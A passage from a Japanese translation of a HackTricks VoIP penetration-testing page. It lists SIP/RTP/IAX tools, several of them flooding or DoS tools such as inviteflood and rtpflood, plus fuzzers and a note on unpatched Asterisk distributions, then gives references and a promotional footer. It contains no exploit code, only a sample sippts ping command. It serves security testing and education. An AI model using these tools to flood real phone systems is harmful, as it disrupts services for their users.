* [**sippts**](https://github.com/Pepelux/sippts)からの**`SIPPTS ping`**：SIPPTS pingはサーバーの応答時間を確認するためにSIP pingを行います。
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/)：Asteriskが使用するIAXプロトコルに対するDoS
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt)：UDP/IP上でSIP/SDP INVITEメッセージの洪水を実行するツール。
* [**rtpflood**](https://www.kali.org/tools/rtpflood/)：いくつかの適切に形成されたRTPパケットを送信します。使用されているRTPポートを知る必要があります（最初にスニッフィング）。
* [**SIPp**](https://github.com/SIPp/sipp)：SIPトラフィックを分析および生成することができます。そのため、DoSにも使用できます。
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak)：SIPスイスアーミーナイフ。SIP攻撃を実行するためにも使用できます。
* Fuzzers：[**protos-sip**](https://www.kali.org/tools/protos-sip/)、[**voiper**](https://github.com/gremwell/voiper)。

### OSの脆弱性

Asteriskなどのソフトウェアをインストールする最も簡単な方法は、すでにインストールされているOSディストリビューションをダウンロードすることです。例：**FreePBX、Elastix、Trixbox**... これらの問題は、一度動作していると、システム管理者がそれらを再度更新しないかもしれず、時間の経過とともに**脆弱性**が発見される可能性があります。

## 参考文献

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学びましょう</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
* 独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションである[**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)を**フォロー**する。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
